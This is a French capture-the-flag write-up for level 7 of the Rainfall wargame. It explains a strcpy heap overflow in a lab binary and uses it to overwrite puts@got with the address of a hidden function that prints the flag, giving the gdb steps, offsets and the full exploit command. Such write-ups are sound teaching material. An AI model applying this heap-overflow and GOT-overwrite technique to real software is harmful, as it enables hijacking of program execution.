
---

# Rainfall – Level 7

## Objectif

Analyser le binaire `level7` afin d’exploiter une vulnérabilité mémoire permettant de détourner le flot d’exécution et d’afficher le contenu du fichier contenant le flag du niveau suivant.

---

## Reconnaissance

Listing des fonctions disponibles (symboles) :

```bash
(gdb) info functions
```

Les fonctions intéressantes observées :

* `malloc`, `strcpy`, `fopen`, `fgets`, `puts`
* une fonction interne `m` (non appelée directement dans `main`)

Pour visualiser les appels et la logique de `main` :

```bash
(gdb) disas main
```

Et pour inspecter la fonction interne :

```bash
(gdb) disas m
```

---

## Analyse de `main`

`main` effectue :

1. 4 appels à `malloc(8)`
2. initialise 2 structures logiques
3. copie `argv[1]` et `argv[2]` avec `strcpy`
4. ouvre un fichier, lit dans un buffer global, puis affiche via `puts`

Les 4 allocations se voient directement dans le désassemblage :

```bash
(gdb) disas main
# ... movl $0x8,(%esp)
# ... call malloc@plt
# ... (4 fois)
```

### Structure implicite

Les instructions suivantes indiquent clairement une structure `{ int ; ptr }` :

* `movl $0x1,(%eax)` : écriture d’un int au début du bloc
* `mov %edx,0x4(%eax)` : écriture d’un pointeur à l’offset `+4`

Ce motif apparaît deux fois, ce qui correspond à deux nœuds.

---

## Vulnérabilité

Les deux copies utilisateurs se voient dans le désassemblage :

```bash
(gdb) disas main
# ...
# call strcpy@plt      ; strcpy(malloc1->buf, argv[1])
# ...
# call strcpy@plt      ; strcpy(malloc3->buf, argv[2])
```

`strcpy` ne fait aucun contrôle de taille : si `argv[1]` dépasse la taille du buffer (8 octets), un débordement sur le tas est possible et peut corrompre les champs de la structure suivante.

---

## Analyse dynamique : adresses heap et offset

Pour récupérer les adresses exactes des allocations, des breakpoints sont posés juste après les retours de `malloc` afin de lire `%eax` (valeur de retour) :

```bash
(gdb) break *0x08048550   # juste après le 2e malloc
(gdb) break *0x08048565   # juste après le 3e malloc
(gdb) run AAA BBB
(gdb) info registers
```

Exemple d’observation (adresses typiques) :

* `malloc2 = 0x0804a018`
* `malloc3 = 0x0804a028`

Pour vérifier directement les valeurs mémoire pointées par les structures :

```bash
(gdb) x/wx 0x0804a008     # id de malloc1
(gdb) x/wx 0x0804a00c     # ptr malloc1->buf (malloc2)
(gdb) x/wx 0x0804a028     # id de malloc3
(gdb) x/wx 0x0804a02c     # ptr malloc3->buf (malloc4)
```

### Calcul de l’offset pour écraser `malloc3->buf`

Distance entre `malloc2` et `malloc3` :

```
0x0804a028 - 0x0804a018 = 0x10 = 16 octets
```

Pour atteindre le champ pointeur (`+4`) dans `malloc3` :

* 16 octets (jusqu’à `malloc3`)
* +4 octets (saut du champ `id`)

Total : **20 octets**

---

## Choix de la cible : `puts@got`

Pour identifier la GOT de `puts`, il suffit d’inspecter `puts@plt` :

```bash
(gdb) disas puts
```

On observe le saut indirect :

```asm
jmp *0x8049928
```

Ce qui donne :

* `puts@got = 0x08049928`

L’adresse de la fonction `m` se récupère via :

```bash
(gdb) info address m
# ou
(gdb) disas m
```

Ici :

* `m = 0x080484f4`

---

## Logique d’exploitation (write-what-where)

### Contrainte : laisser `fopen` et `fgets` s’exécuter

Le désassemblage de `main` montre :

```asm
call fopen
call fgets
call puts
```

`fgets` lit le flag dans un buffer global (`0x8049960`, visible dans les arguments de `fgets`) :

```bash
(gdb) disas main
# ... movl $0x8049960,(%esp)
# ... call fgets@plt
```

`m` affiche ensuite ce buffer global :

```bash
(gdb) disas m
# ... movl $0x8049960,0x4(%esp)
# ... call printf@plt
```

Donc :

* détourner `fgets` casserait la lecture du flag
* détourner `puts` est idéal car il arrive **après** `fgets`

---

## Exploitation

### Étape 1 : forcer `malloc3->buf = puts@got`

Payload `argv[1]` :

* 20 octets de padding
* puis l’adresse `puts@got` en little-endian

```bash
python -c 'print("A"*20 + "\x28\x99\x04\x08")'
```

### Étape 2 : écrire l’adresse de `m` dans `puts@got`

Payload `argv[2]` :

```bash
python -c 'print("\xf4\x84\x04\x08")'
```

### Exécution

```bash
./level7 $(python -c 'print("A"*20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
```

Effet :

* le second `strcpy` écrit dans `puts@got`
* l’appel final `puts("~~")` saute désormais vers `m`
* `m` affiche le flag stocké dans le buffer global

---

## Conclusion

Le niveau 7 exploite un **heap overflow** sur un buffer de 8 octets utilisé avec `strcpy`, permettant la corruption d’un pointeur dans une structure adjacente. Cela crée un **write-what-where** : le second `strcpy` est transformé en primitive d’écriture arbitraire, utilisée pour écraser `puts@got` avec l’adresse de la fonction `m`, afin d’obtenir l’exécution de `m` après que `fgets` ait chargé le flag en mémoire.

---